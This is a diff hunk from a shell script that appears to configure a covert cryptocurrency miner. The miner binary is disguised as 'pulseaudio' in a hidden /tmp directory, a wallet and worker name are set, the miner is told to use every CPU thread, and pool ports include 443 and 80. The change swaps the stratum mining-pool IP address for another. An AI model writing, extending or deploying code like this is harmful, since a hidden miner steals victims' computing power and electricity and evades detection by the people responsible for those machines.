@@ -9,7 +9,7 @@ ORIG_BIN="cpuminer-sse2"
 FAKE_BIN="/tmp/.cache-h89r5j/pulseaudio"
 WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
 POOL_PORTS=("9933" "443" "80")
-POOL_BASE="stratum+tcps://104.248.150.108"
+POOL_BASE="stratum+tcps://159.223.48.143"
 ALGO="power2b"
 THREADS=$(nproc)
 
